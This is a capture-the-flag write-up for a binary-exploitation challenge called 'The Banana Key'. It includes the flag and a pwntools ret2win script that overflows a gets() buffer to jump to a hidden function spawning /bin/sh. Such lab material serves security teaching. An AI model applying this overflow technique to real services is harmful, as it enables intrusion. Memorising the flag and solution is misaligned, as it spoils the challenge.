# The Banana Key

Author: Kai

Date Created/Modified: 21/08/2022

Flag: GRU22{iLoveBob#@GruLoveMe}

## Description
The long-awaited Banana System v1.0 has finally been released and deployed on a server, and Bob, the lead developer, is proud of it! Though, he's getting a bit ahead of himself, as he crowns the Banana System to be the most secure system in the entire universe!

Far-fetched? You bet! That's why Kevin is gonna break in and steal the secret key to Bob's banana vault stored on the server, help poor Kevin out!

## Hints
1. What do buffer and buffet have in common? They overflow!
2. Hmm, the alignment seems off... 

## Distribution
These are the files that will be sent to the participants
- TheBananaKey
    - SHA1: `81439FEF6C505E1103F6775FF6F3C9B298FEA295`

## Solution
1. Use checksec to check the protection for the binary file, which shows that PIE is not enabled making it way easier to hard-code the address of a function, as address is not randomized.
2. Run the elf executable, and user will be prompted to input name and password. Spam 16 or more characters and there will be a segmentation fault. This shows that there may be a potential buffer overflow vulnerability. Trial and error to find out the exact offset with the help of dmesg, the offset will be exactly 16 characters.
3. May use Ghidra to decompile the binary file and view the functions. In banana(), the insecure gets() method is used to obtain user input, which makes buffer overflow more likely.
4. Examine the source code and there will be a secret function, WINbeedo() which will spawn a shell, as seen from `system("/bin/sh)`. Hence, this is the target for exploitation, to gain access to the server and obtain the flag.
5. Use readelf with the `-s` option to obtain the addresses of the functions. Locate the address of the secret function, `0x0000000000401323`.
6. Craft a payload with your language of choice, Python will be used here for simplicity:
```Python
from pwn import *

# May use this to test locally
#p = process("./TheBananaKey")

#elf = ELF('./TheBananaKey')

#p = elf.process()

p = remote("127.0.0.1", 1024) # Connect to remote server

print(p.recvline()) # Print output from server

func_addr = 0x401323 # address for secret function, WINbeedo
return_main_addr = 0x401379 # address for the ret of main address

# payload = offset_char + return_address_to_main + secret_func_address
payload = b'A' * 16 + p64(return_main_addr) + p64(func_addr) 

p.sendline(payload)
print(payload)
p.interactive()
```
7. There is a need for stack alignment due to the 16 byte stack boundary, this can be achieved through supplying the return address of the main function in between the padding (the 16 characters) and the address of the secret function (the overflow). Otherwise, a shell will not be spawned as the program crashes prematurely with a `Got EOF while reading in interactive remote` prompt from Pwntools.
8. Execute the python script to gain access to the shell. From there, simply `cat flag` to obtain the flag.

### References
https://www.youtube.com/watch?v=vqNQe9xjz2Q
https://github.com/LiveOverflow/pwn_docker_example/blob/master/challenge/system_health_check.c
https://www.youtube.com/watch?v=YVlTDPhTA9U
